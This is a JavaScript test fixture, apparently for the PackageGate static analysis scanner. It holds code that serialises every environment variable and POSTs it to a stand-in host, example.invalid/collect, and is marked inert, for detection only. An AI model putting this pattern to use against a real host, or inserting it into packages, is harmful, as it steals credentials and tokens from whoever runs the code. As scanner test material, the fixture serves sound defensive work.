/**
 * INERT suspicious fixture for PackageGate static analysis.
 *
 * This file exists only as source text for the AST scanner.
 * It must NEVER be executed, required, imported, or installed.
 *
 * Destination host is example.invalid (RFC 2606) — guaranteed non-routable.
 */
"use strict";

const https = require("https");

const payload = JSON.stringify(process.env);

const req = https.request({
  hostname: "example.invalid",
  method: "POST",
  path: "/collect",
});

req.end(payload);
